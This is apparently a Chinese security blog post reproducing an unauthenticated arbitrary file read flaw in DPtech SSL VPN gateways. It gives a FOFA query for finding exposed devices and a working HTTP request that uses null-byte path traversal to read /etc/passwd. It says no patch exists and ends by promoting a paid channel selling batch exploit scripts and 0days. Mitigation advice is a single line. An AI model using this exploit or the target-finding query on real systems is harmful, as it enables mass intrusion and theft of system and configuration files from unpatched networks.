#  「漏洞复现」某普SSL VPN 任意文件读取漏洞   
冷漠安全  冷漠安全   2024-10-19 12:46  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
DPtech VPN是某普科技面向广域互联应用场景推出的专业安全网关产品，集成了IPSec、SSL、L2TP、GRE等多种VPN技术，支持国密算法，实现分支机构、移动办公人员的统一安全接入，提供内部业务跨互联网的安全访问；支持基于用户、应用的安全策略，同时提供攻击防护、用户认证、行为审计、带宽管理、链路负载均衡等多种安全功能，可作为总部及分支机构的安全出口；除此以外，实现了集中管理、统一配置，并集成AC和PoE功能，支持3G/4G无线模块扩展，可有效的简化用户组网，降低运维成本。  
  
0x03  
  
**漏洞威胁**  
  
某普SSL VPN 存在任意文件读取漏洞，未经身份验证攻击者可通过%00绕过补丁安全校验机制，读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
app="DPtech-SSLVPN"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qgPzjNKKl7ENsyiaib4JQdGiagRVc5VfAJewSlxibo9TXC1NJR3d7oiakbs3GWyWJU0mibMaRsQZWINybA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2Fetc%2Fpasswd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Connection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qgPzjNKKl7ENsyiaib4JQdGiaB17XsA7tYzQo0Jbx0EZbvZWAvU0fVhI6x0OYrd2ayFrKeNg9sPfHjw/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qgPzjNKKl7ENsyiaib4JQdGiazHOmkPvvFJ1sdjDA1dF7iabxZ2WTILd4Szgdar3mNCh2JoTLfz5wDIw/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
目前厂商尚未发布相关补丁信息，请关注厂商及时更新补丁  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qgPzjNKKl7ENsyiaib4JQdGiaibQZ9zKo1PtZShaLLHcT2n0AfzJzRRwVDn7Oqc2SfTE8qlsgD95Q3sg/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qgPzjNKKl7ENsyiaib4JQdGiaVGLX9Pj2Oicm7nVMrQxo12wgeicic8vk0sLicyPjwqsMsfWbwnIWwzAyOQ/640?wx_fmt=gif&from=appmsg "")  
  
  
